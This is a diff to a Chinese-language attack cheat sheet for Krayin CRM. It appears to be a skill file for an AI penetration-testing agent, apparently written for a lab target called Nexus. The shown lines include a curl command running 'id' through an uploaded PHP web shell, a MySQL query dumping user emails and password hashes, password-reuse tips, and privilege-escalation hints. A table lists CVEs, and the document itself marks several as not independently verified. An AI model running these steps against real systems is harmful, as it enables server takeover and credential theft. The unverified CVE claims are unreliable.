@@ -4,7 +4,7 @@ description: 'Krayin CRM 攻击速查：CVE-2026-38526 TinyMCE 上传 RCE、凭�
 disable-model-invocation: true
 metadata: { domain: web, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # Krayin CRM (Webkul) 攻击速查
 
@@ -23,7 +23,7 @@ Set-Cookie: krayin_crm_session=
 # 版本
 # Admin panel footer: "Powered by Krayin"
 # /composer.json → "krayin/laravel-crm": "2.2.x"
-```
+```text
 
 ## CVE-2026-38526 — TinyMCE 文件上传 RCE (CVSS 9.9)
 
@@ -41,18 +41,18 @@ curl -s -b <auth_cookie> \
 
 # RCE
 curl "http://<target>/storage/tinymce/<hash>.php?c=id"
-```
+```text
 
 ## 其他已知 CVE
 
 | CVE | 类型 | 认证 | 说明 |
 |-----|------|------|------|
-| CVE-2026-38526 | 任意文件上传 → RCE | 需要 | TinyMCE upload |
-| CVE-2026-36340 | 邮件附件上传 → RCE | 需要 | compose email 功能 (v2.1.5) |
-| CVE-2026-38532 | BOLA 密码重置 | 需要 | UserController 越权重置密码 |
-| CVE-2026-38530 | BOLA Lead 读取 | 需要 | 越权读其他用户的 leads |
-| CVE-2026-38528 | SQL 注入 | 需要 | rotten_lead 参数 |
-| CVE-2026-5370 | XSS + 代码注入 | — | Activities/Notes 模块 |
+| CVE-2026-38526 | 任意文件上传 → RCE | 需要 | TinyMCE upload（Nexus 靶机特定编号，未独立核实） |
+| CVE-2026-36340 | 邮件附件上传 → RCE | 需要 | compose email 功能 (v2.1.5)（已公开核实） |
+| CVE-2026-38532 | BOLA 密码重置 | 需要 | UserController 越权重置密码（未独立核实） |
+| CVE-2026-38530 | BOLA Lead 读取 | 需要 | 越权读其他用户的 leads（未独立核实） |
+| CVE-2026-38528 | SQL 注入 | 需要 | rotten_lead 参数（未独立核实） |
+| CVE-2026-5370 | XSS + 代码注入 | — | Activities/Notes 模块（已公开核实） |
 
 ## 凭据来源
 
@@ -70,7 +70,7 @@ mysql -u krayin -p<password> -e "SELECT email, password FROM krayin.users;"
 
 # 4. 密码复用
 # Krayin 登录密码可能 = DB 密码 → 直接试
-```
+```text
 
 ## 登录绕过思路
 
@@ -95,4 +95,4 @@ mysql -u krayin -p<DB_PASSWORD> -h 127.0.0.1
 # 提权线索
 systemctl list-timers --all | grep -i gitea
 cat /etc/gitea/template-sync.py  # Nexus 特定
-```
+```text
